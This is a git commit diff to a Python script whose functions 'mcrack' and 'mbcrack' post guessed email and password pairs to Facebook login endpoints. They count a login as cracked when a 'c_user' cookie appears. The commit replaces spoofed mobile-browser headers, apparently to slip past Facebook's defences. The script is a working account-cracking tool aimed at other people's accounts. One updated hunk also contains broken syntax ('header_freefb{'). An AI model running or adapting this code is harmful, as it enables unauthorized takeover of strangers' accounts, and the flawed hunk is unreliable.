3af26dd88e18d219564df88e0ffa595d67a363ca
AHSANRJ244 <134211459+AHSANRJ244@users.noreply.github.com>
2023-05-25 14:09:30 +0500

    Update jan.py

--- jan.py
+++ jan.py
@@ -188,23 +188,46 @@ def mcrack(uid,pwx,tl):
 			"email":uid,
 			"pass":ps,
 			"login":"Log In"}
-			header_freefb = {'authority': 'm.facebook.com',
-   'method': 'POST',
-   'scheme': 'https',
-   'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-   'accept-language': 'en-US,en;q=0.9',
-   'cache-control': 'max-age=0',
-   'referer': 'https://www.google.com/',    'sec-ch-prefers-color-scheme': 'light',
-   'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',    'sec-ch-ua-full-version-list': '"Chromium";v="107.0.5304.74", "Not=A?Brand";v="24.0.0.0"',
-   'sec-ch-ua-mobile': '?1',
-   'sec-ch-ua-platform': '"Android"',
-   'sec-ch-ua-platform-version': '"9.0.0"',
-   'sec-fetch-dest': 'document',
-   'sec-fetch-mode': 'navigate',
-   'sec-fetch-site': 'cross-site',
-   'sec-fetch-user': '?1',
-   'upgrade-insecure-requests': '1',
-   'user-agent': pro}
+			header_freefb = {
+
+    'authority': 'mbasic.facebook.com',
+
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+
+    'accept-language': 'en-US,en;q=0.9',
+
+    'cache-control': 'max-age=0',
+
+
+    'referer': 'https://www.google.com/',
+
+    'sec-ch-prefers-color-scheme': 'light',
+
+    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+
+    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
+
+    'sec-ch-ua-mobile': '?1',
+
+    'sec-ch-ua-platform': '"Android"',
+
+    'sec-ch-ua-platform-version': '"9.0.0"',
+
+    'sec-fetch-dest': 'document',
+
+    'sec-fetch-mode': 'navigate',
+
+    'sec-fetch-site': 'cross-site',
+
+    'sec-fetch-user': '?1',
+
+    'upgrade-insecure-requests': '1',
+
+    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
+
+    'viewport-width': '980',
+
+}
 			lo = session.post('https://x.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text
 			#log_cookies=session.cookies.get_dict().keys()
 			if 'c_user' in log_cookies:
@@ -294,23 +317,45 @@ def mbcrack(uid,pwx,tl):
 			"email":uid,
 			"pass":ps,
 			"login":"Log In"}
-			header_freefb = {'authority': 'm.facebook.com',
-   'method': 'POST',
-   'scheme': 'https',
-   'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-   'accept-language': 'en-US,en;q=0.9',
-   'cache-control': 'max-age=0',
-   'referer': 'https://www.google.com/',    'sec-ch-prefers-color-scheme': 'light',
-   'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',    'sec-ch-ua-full-version-list': '"Chromium";v="107.0.5304.74", "Not=A?Brand";v="24.0.0.0"',
-   'sec-ch-ua-mobile': '?1',
-   'sec-ch-ua-platform': '"Android"',
-   'sec-ch-ua-platform-version': '"9.0.0"',
-   'sec-fetch-dest': 'document',
-   'sec-fetch-mode': 'navigate',
-   'sec-fetch-site': 'cross-site',
-   'sec-fetch-user': '?1',
-   'upgrade-insecure-requests': '1',
-   'user-agent': pro}
+			header_freefb{
+
+    'authority': 'mbasic.facebook.com',
+
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+
+    'accept-language': 'en-US,en;q=0.9',
+
+    'cache-control': 'max-age=0',
+
+    'referer': 'https://www.google.com/',
+
+    'sec-ch-prefers-color-scheme': 'light',
+
+    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+
+    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
+
+    'sec-ch-ua-mobile': '?1',
+
+    'sec-ch-ua-platform': '"Android"',
+
+    'sec-ch-ua-platform-version': '"9.0.0"',
+
+    'sec-fetch-dest': 'document',
+
+    'sec-fetch-mode': 'navigate',
+
+    'sec-fetch-site': 'cross-site',
+
+    'sec-fetch-user': '?1',
+
+    'upgrade-insecure-requests': '1',
+
+    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
+
+    'viewport-width': '980',
+
+}
 			lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			if 'c_user' in log_cookies:
